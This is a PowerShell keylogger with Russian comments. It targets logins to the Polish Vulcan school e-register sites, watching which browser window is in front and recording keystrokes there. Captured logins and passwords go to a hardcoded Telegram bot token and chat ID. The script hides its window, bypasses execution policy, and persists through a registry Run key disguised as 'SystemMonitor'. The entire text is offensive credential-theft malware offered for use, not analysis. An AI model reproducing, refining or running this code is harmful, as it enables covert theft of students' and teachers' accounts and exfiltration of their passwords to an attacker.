# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ЛОГИНА И ПАРОЛЯ ВУЛКАН
$keyloggerStatus = "Starting..."

# Создаем улучшенный кейлоггер
$keyloggerScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Runtime.InteropServices

# API для получения информации о браузерах
`$signature = @'
[DllImport("user32.dll")]
public static extern IntPtr GetForegroundWindow();

[DllImport("user32.dll")]
public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);

[DllImport("user32.dll")]
public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
'@

Add-Type -MemberDefinition `$signature -Name Win32 -Namespace Api

# Список целевых сайтов Вулкан
`$vulcanUrls = @(
    "*vulcan*",
    "*uonetplus*", 
    "*dziennik*",
    "*edu.gdynia*",
    "*eszkola.opolskie.pl*",
    "*cufs.vulcan.net.pl*",
    "*dziennik-logowanie.vulcan.net.pl*",
    "*Account/LogOn*",
    "*minrol*"
)

`$capturedData = @()
`$currentWindow = ""
`$buffer = ""
`$isVulcanSite = `$false
`$loginData = ""
`$passwordData = ""
`$lastProcessName = ""

function Get-ActiveWindowInfo {
    try {
        `$hWnd = [Api.Win32]::GetForegroundWindow()
        if(`$hWnd -eq [IntPtr]::Zero) { return `$null }
        
        `$titleBuilder = New-Object System.Text.StringBuilder 256
        `$result = [Api.Win32]::GetWindowText(`$hWnd, `$titleBuilder, `$titleBuilder.Capacity)
        
        `$processId = 0
        [Api.Win32]::GetWindowThreadProcessId(`$hWnd, [ref]`$processId)
        
        if(`$processId -ne 0) {
            `$process = Get-Process -Id `$processId -ErrorAction SilentlyContinue
            `$processName = if(`$process) { `$process.ProcessName } else { "Unknown" }
        } else {
            `$processName = "Unknown"
        }
        
        return @{
            Title = `$titleBuilder.ToString()
            ProcessName = `$processName
            ProcessId = `$processId
        }
    } catch {
        return `$null
    }
}

function Test-VulcanSite {
    param(`$windowInfo)
    
    if(!`$windowInfo) { return `$false }
    
    `$title = `$windowInfo.Title
    `$process = `$windowInfo.ProcessName.ToLower()
    
    # Проверяем браузеры
    `$isBrowser = `$process -match "chrome|firefox|edge|iexplore|opera|brave"
    
    if(!`$isBrowser) { return `$false }
    
    # Проверяем заголовок на наличие ключевых слов Вулкан
    foreach(`$url in `$vulcanUrls) {
        if(`$title -like `$url) {
            return `$true
        }
    }
    
    # Дополнительные проверки для популярных браузеров
    if(`$isBrowser) {
        # Проверяем URL через JavaScript injection simulation
        `$browserKeywords = @("vulcan", "dziennik", "uonet", "logowanie", "login", "password", "hasło")
        foreach(`$keyword in `$browserKeywords) {
            if(`$title -match `$keyword) {
                return `$true
            }
        }
    }
    
    return `$false
}

function Send-ToTelegram {
    param(`$message)
    try {
        `$body = @{
            chat_id = '5674514050'
            text = `$message
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
    } catch { }
}

function Process-Buffer {
    if(`$buffer -ne "") {
        # Определяем тип данных по контексту
        if(`$buffer -match "(login|user|username|uzytkownik|nazwa|email|e-mail|@)") {
            `$script:loginData = `$buffer
            Send-ToTelegram "🔑 VULCAN LOGIN DETECTED: `$buffer"
        } elseif(`$buffer -match "(password|haslo|pass|pwd)") {
            `$script:passwordData = `$buffer
            Send-ToTelegram "🔒 VULCAN PASSWORD DETECTED: `$buffer"
        } else {
            # Проверяем, похоже ли на логин (содержит @ или типичные логины)
            if(`$buffer -match ".+@.+\..+" -or `$buffer -match "^[a-zA-Z0-9._-]{3,20}`$") {
                `$script:loginData = `$buffer
                Send-ToTelegram "🔑 VULCAN LOGIN (AUTO-DETECTED): `$buffer"
            } else {
                # Отправляем обычные данные только если они не пустые и не служебные
                if(`$buffer.Trim() -ne "" -and `$buffer -notmatch "^\[.*\]`$") {
                    Send-ToTelegram "📝 VULCAN INPUT: `$buffer"
                }
            }
        }
        
        # Если есть и логин и пароль - отправляем вместе
        if(`$script:loginData -ne "" -and `$script:passwordData -ne "") {
            Send-ToTelegram "🎯 VULCAN CREDENTIALS COMPLETE:`nLogin: `$script:loginData`nPassword: `$script:passwordData"
            `$script:loginData = ""
            `$script:passwordData = ""
        }
        
        `$script:capturedData += `$buffer
        `$script:buffer = ""
    }
}

function Handle-KeyPress {
    param(`$key)
    
    switch(`$key) {
        "Enter" { 
            Process-Buffer
        }
        "Space" { 
            `$script:buffer += " " 
        }
        "Back" { 
            if(`$script:buffer.Length -gt 0) { 
                `$script:buffer = `$script:buffer.Substring(0, `$script:buffer.Length - 1) 
            }
        }
        "Tab" { 
            `$script:buffer += "[TAB]"
            Process-Buffer
        }
        "LButton" { 
            Process-Buffer
        }
        "RButton" { 
            Process-Buffer
        }
        "Escape" {
            `$script:buffer = ""
        }
        default {
            # Обрабатываем обычные символы
            if(`$key -ge 65 -and `$key -le 90) {
                # Буквы A-Z
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                `$isCaps = [System.Windows.Forms.Console]::CapsLock
                
                if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
                    `$script:buffer += `$key.ToString()
                } else {
                    `$script:buffer += `$key.ToString().ToLower()
                }
            } elseif(`$key -ge 48 -and `$key -le 57) {
                # Цифры 0-9
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                if(`$isShift) {
                    `$script:buffer += `$symbols[`$key - 48]
                } else {
                    `$script:buffer += (`$key - 48).ToString()
                }
            } elseif(`$key -eq 190 -or `$key -eq 110) {
                # Точка
                `$script:buffer += "."
            } elseif(`$key -eq 189 -or `$key -eq 109) {
                # Минус/дефис
                `$script:buffer += "-"
            } elseif(`$key -eq 187 -or `$key -eq 107) {
                # Плюс/равно
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                if(`$isShift) {
                    `$script:buffer += "+"
                } else {
                    `$script:buffer += "="
                }
            } elseif(`$key -eq 186 -or `$key -eq 59) {
                # Точка с запятой/двоеточие
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                if(`$isShift) {
                    `$script:buffer += ":"
                } else {
                    `$script:buffer += ";"
                }
            } elseif(`$key -eq 222 -or `$key -eq 192) {
                # Кавычки/апостроф/тильда
                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                if(`$key -eq 222) {
                    if(`$isShift) {
                        `$script:buffer += "`""
                    } else {
                        `$script:buffer += "'"
                    }
                } else {
                    if(`$isShift) {
                        `$script:buffer += "~"
                    } else {
                        `$script:buffer += "`""
                    }
                }
            }
        }
    }
    
    # Автоматически отправляем длинные вводы
    if(`$script:buffer.Length -gt 30) {
        Process-Buffer
    }
}

# Основной цикл
while(`$true) {
    try {
        `$windowInfo = Get-ActiveWindowInfo
        `$isCurrentlyVulcan = Test-VulcanSite -windowInfo `$windowInfo
        
        if(`$isCurrentlyVulcan) {
            if(!`$script:isVulcanSite) {
                `$script:isVulcanSite = `$true
                `$script:lastProcessName = `$windowInfo.ProcessName
                Send-ToTelegram "🎯 USER OPENED VULCAN SITE:`nTitle: `$(`$windowInfo.Title)`nBrowser: `$(`$windowInfo.ProcessName)"
            }
        } else {
            if(`$script:isVulcanSite) {
                `$script:isVulcanSite = `$false
                Process-Buffer
                Send-ToTelegram "📱 USER LEFT VULCAN SITE (Browser: `$script:lastProcessName)"
                `$script:lastProcessName = ""
            }
        }
        
        # Перехватываем нажатия клавиш только на сайтах Вулкан
        if(`$script:isVulcanSite) {
            for(`$i = 8; `$i -lt 255; `$i++) {
                `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
                if(`$keyState -eq -32767) {
                    `$key = [System.Windows.Forms.Keys]`$i
                    Handle-KeyPress -key `$key
                }
            }
        }
    } catch { 
        # Игнорируем ошибки для стабильности
    }
    Start-Sleep -Milliseconds 1
}
"@

# Сохраняем и запускаем улучшенный кейлоггер
try {
    $keyloggerScript | Out-File "$env:TEMP\vulcan_logger_advanced.ps1" -Encoding ASCII
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger_advanced.ps1`"" -WindowStyle Hidden
    
    # Добавляем в автозагрузку
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger_advanced.ps1`""
    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
    
    $keyloggerStatus = "✅ Advanced Vulcan keylogger ACTIVE - monitoring ALL browsers"
} catch {
    $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
}
